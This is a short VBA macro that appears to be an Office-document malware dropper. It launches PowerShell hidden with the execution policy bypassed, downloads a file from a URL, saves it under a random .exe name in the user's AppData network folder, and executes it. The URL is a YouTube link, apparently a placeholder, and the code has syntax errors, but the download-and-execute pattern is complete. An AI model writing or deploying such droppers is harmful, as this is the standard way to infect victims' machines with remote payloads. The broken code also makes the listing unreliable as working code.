Sub lesGo()
    Option Explicit

    rando = RandomString(25) & ".exe"

    On Error Resume Next

    CreateObject("Wscript.Shell").Run """" CreateObject("Scripting.FileSystemObject").BuildPath(CreateObject("Wscript.Shell").expandenvironmentstrings("%systemroot%") _
         , "System32\WindowsPowerShell\v1.0\powershell.exe") & """-Executionpolicy bypass -noprofile " _
      & " -windowstyle hidden -command ""Set-Content -value " _
      & " (new-object System.net.webclient)" _
      & ".downloaddata( 'https:////www.youtube.com/watch?v=oHg5SJYRHA0' ) " _
      & " -encoding byte -Path  $env:appdata\Microsoft\Network\Connections\" & rando & "; " _
      & " Start-Process ""$env:appdata\Microsoft\Network\Connections\" & rando & """""", 0
End Sub


Function RandomString(ByVal strLen)
    Dim str, min, max

    Const LETTERS = "abcdefghijklmnopqrstuvwxyz0123456789"
    min = 1
    max = Len(LETTERS)

    Randomize
    For i = 1 To strLen
        str = str & Mid(LETTERS, Int((max - min + 1) * Rnd + min), 1)
    Next
    RandomString = str
End Function